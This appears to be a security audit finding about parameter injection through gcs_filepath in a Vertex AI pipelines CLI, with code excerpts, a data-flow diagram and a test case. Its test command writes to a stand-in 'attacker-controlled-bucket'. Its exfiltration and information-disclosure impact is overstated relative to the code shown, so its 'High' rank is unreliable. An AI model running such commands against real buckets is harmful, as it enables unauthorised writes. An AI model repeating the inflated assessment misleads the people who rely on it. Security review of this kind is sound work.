### Vulnerability 1: Pipeline Input Injection via `gcs_filepath` parameter

*   **Description:**
    An attacker can inject malicious values into the `gcs_filepath` pipeline parameter via the `-p` option in the `pipelines-cli run` command. This parameter, used in the `sample_pipeline.py`, directly controls the output file path in Google Cloud Storage (GCS) for the `_save_message_to_file` component. By manipulating this parameter, an attacker could potentially overwrite or write files to arbitrary GCS paths accessible by the pipeline's service account. This is a pipeline input injection vulnerability because user-controlled input directly influences the pipeline's behavior without proper validation or sanitization within the pipeline code itself.

    **Steps to trigger the vulnerability:**
    1.  Compile the `sample_pipeline.py` using `pipelines-cli compile sample_pipeline pipeline gs://path/to/pipeline.json`.
    2.  Prepare a `pipeline-run-config.yaml` file with necessary configurations.
    3.  Execute the pipeline using `pipelines-cli run pipeline-run-config.yaml -p "message=Malicious Content" -p "gcs_filepath=gs://attacker-controlled-bucket/malicious-file.txt"`.
    4.  Observe that the pipeline attempts to write "Malicious Content" to the GCS path `gs://attacker-controlled-bucket/malicious-file.txt`, assuming the pipeline's service account has write access to this location. An attacker could replace `gs://attacker-controlled-bucket/malicious-file.txt` with a path to overwrite existing important data if the service account permissions allow it.

*   **Impact:**
    High. Successful exploitation of this vulnerability could allow an attacker to:
    *   **Data exfiltration/modification:** Write arbitrary content to GCS buckets accessible by the pipeline's service account. This could be used to exfiltrate sensitive data by writing it to an attacker-controlled bucket or to modify existing data by overwriting files in buckets the service account has write access to.
    *   **Privilege escalation (in some scenarios):** If the service account used by the pipeline has overly permissive access, an attacker could potentially overwrite critical system files or configuration files in GCS, leading to further compromise of the GCP environment.
    *   **Information disclosure:** By writing to locations they can later access, attackers can use the pipeline's service account to read data that the service account can access and write it to a location they control.

*   **Vulnerability Rank:** High

*   **Currently implemented mitigations:**
    None. The provided code does not implement any input validation or sanitization for pipeline parameters, specifically the `gcs_filepath` parameter. The `_save_message_to_file` component in `sample_pipeline.py` directly uses the provided `gcs_filepath` without any checks.

*   **Missing mitigations:**
    *   **Input validation and sanitization within the pipeline component:** The `_save_message_to_file` component (and any component that handles user-provided file paths or similar sensitive parameters) should implement robust input validation. For `gcs_filepath`, this could include:
        *   **Path validation:** Ensure the path conforms to expected patterns (e.g., starts with `gs://`, bucket name is valid, etc.).
        *   **Path restriction:** Restrict the output path to a predefined set of allowed buckets or directories.
        *   **Content sanitization:** If the content being written is also user-provided, it should be sanitized to prevent injection of control characters or malicious payloads, although this is less relevant for this specific file path injection vulnerability.
    *   **Principle of least privilege for service accounts:**  Ensure the service account used by the pipeline has the minimum necessary permissions. Avoid granting overly broad write access to GCS buckets. Ideally, the service account should only have write access to specific buckets and paths required for the pipeline's legitimate operations.

*   **Preconditions:**
    *   The attacker needs to be able to execute the `pipelines-cli run` command. This typically implies access to the environment where the CLI is installed and configured, which might be a developer's machine or a CI/CD system.
    *   The Kubeflow pipeline must be configured to use a service account that has write permissions to GCS buckets.
    *   The target pipeline must use user-provided input to construct file paths or perform operations that are sensitive to path manipulation, as is the case with `gcs_filepath` in `sample_pipeline.py`.

*   **Source code analysis:**

    1.  **`src/pipelines/console.py`:** The `run` command in the CLI is defined in `src/pipelines/console.py`.
    ```python
    @cli.command()
    @click.argument("run_config_file")
    @click.option(
        "-p",
        "--param",
        multiple=True,
        help=(
            "Pipeline-specific params in key=value format."
            " Example: `-p 'message=hello world'`"
        ),
    )
    def run(run_config_file: str, **pipeline_args: int) -> None:
        """Runs a Kubeflow pipeline in Vertex AI Pipelines.

        RUN_CONFIG_FILE is used to specify the Pipelines job params.
        """  # noqa: DAR101
        pipeline_params = _parse_pipeline_args(pipeline_args)
        run_config = pipeline_runner.PipelineRunConfig.from_file(run_config_file)
        pipeline_runner.run(run_config, pipeline_params)
    ```
    The `-p` options are parsed by `_parse_pipeline_args` and passed as `pipeline_params` to `pipeline_runner.run`.

    2.  **`src/pipelines/console.py` - `_parse_pipeline_args`:**
    ```python
    def _parse_pipeline_args(pipeline_args: Dict[str, Any]) -> Dict[str, Any]:
        """Parses pipeline keyword arguments."""
        args = pipeline_args["param"]
        params = dict([p.split("=") for p in args])
        return params
    ```
    This function simply splits the `-p` arguments by `=` and creates a dictionary. No validation or sanitization is performed here.

    3.  **`src/pipelines/pipeline_runner.py` - `run`:**
    ```python
    def run(
        run_config: PipelineRunConfig,
        pipeline_params: Dict[str, Any],
    ) -> str:
        """Runs a Kubeflow pipeline given by specification file.

        Args:
            run_config: Vertex Pipelines pipeline run configuration.
            pipeline_params: Kubeflow pipeline parameters

        Returns:
            Vertex Pipelines job ID.
        """
        job_id = utils.get_job_id(run_config.pipeline_name)
        vertex.PipelineJob(
            display_name=run_config.pipeline_name,
            job_id=job_id,
            template_path=run_config.pipeline_path,
            pipeline_root=run_config.gcs_root_path,
            parameter_values=pipeline_params, # User-provided parameters are passed here
            enable_caching=run_config.enable_caching,
            location=run_config.location,
        ).run(
            service_account=run_config.service_account,
            sync=run_config.sync,
        )
        return job_id
    ```
    The `pipeline_params` dictionary, which contains user-provided inputs from the CLI, is directly passed to the `parameter_values` argument of `vertex.PipelineJob`.

    4.  **`src/pipelines/sample_pipeline.py` - `_save_message_to_file` component:**
    ```python
    @dsl.component(base_image="python:3.10", packages_to_install=["cloudpathlib==0.10.0"])
    def _save_message_to_file(message: str, gcs_filepath: str) -> None:
        """Saves a given message to a given file in GCS."""
        import cloudpathlib as cpl

        with cpl.CloudPath(gcs_filepath).open("w") as fp: # gcs_filepath is directly used here
            fp.write(message)
    ```
    The `_save_message_to_file` component directly uses the `gcs_filepath` parameter to create a `CloudPath` object and open it in write mode. There is no validation or sanitization of `gcs_filepath` within this component.

    **Visualization of Data Flow:**

    ```
    User Input (CLI: pipelines-cli run -p "gcs_filepath=...")
        --> console.py (_parse_pipeline_args)
            --> pipeline_params (Dictionary)
                --> pipeline_runner.py (run)
                    --> vertex.PipelineJob(parameter_values=pipeline_params)
                        --> Vertex AI Pipelines Execution
                            --> sample_pipeline.py (_save_message_to_file component)
                                --> cpl.CloudPath(gcs_filepath).open("w")  # Vulnerable point: direct use of user-provided gcs_filepath
    ```

*   **Security test case:**

    **Pre-requisites:**
    1.  A GCP project with Vertex AI Pipelines enabled.
    2.  Terraform or manual setup of Vertex AI Pipelines environment as described in `README.md`.
    3.  Installation of `pipelines-cli` as described in `README.md`.
    4.  Configuration of `pipeline-run-config.yaml` with valid GCP project details, including a service account with write access to GCS.
    5.  Ensure the service account used by the pipeline has write permissions to a GCS bucket you control for testing purposes (e.g., `gs://attacker-controlled-bucket`).

    **Steps:**
    1.  **Compile the sample pipeline:**
        ```bash
        pipelines-cli compile sample_pipeline pipeline gs://path/to/pipeline.json # Replace gs://path/to/pipeline.json with a valid GCS path
        ```

    2.  **Prepare `pipeline-run-config.yaml`:** Ensure `pipeline-path` in this file points to the compiled pipeline JSON from step 1, and `gcs-root-path` and `service-account` are correctly configured.

    3.  **Execute the pipeline with a malicious `gcs_filepath` parameter:**
        ```bash
        pipelines-cli run pipeline-run-config.yaml \
            -p "message=This is a test of file overwrite vulnerability" \
            -p "gcs_filepath=gs://attacker-controlled-bucket/pwned.txt" # Replace gs://attacker-controlled-bucket with a GCS bucket you control
        ```

    4.  **Verify the exploit:**
        After the pipeline run completes successfully, check the GCS bucket `gs://attacker-controlled-bucket/`. You should find a file named `pwned.txt` containing the message "This is a test of file overwrite vulnerability". This confirms that the attacker-controlled `gcs_filepath` parameter was successfully used by the pipeline to write to an arbitrary GCS location.

        **Note:** For a more impactful test, instead of an attacker-controlled bucket, try to overwrite a file in a bucket that the pipeline's service account legitimately has write access to, to demonstrate potential data modification within the project's intended storage. Be cautious and only perform such tests in a non-production environment and with explicit authorization.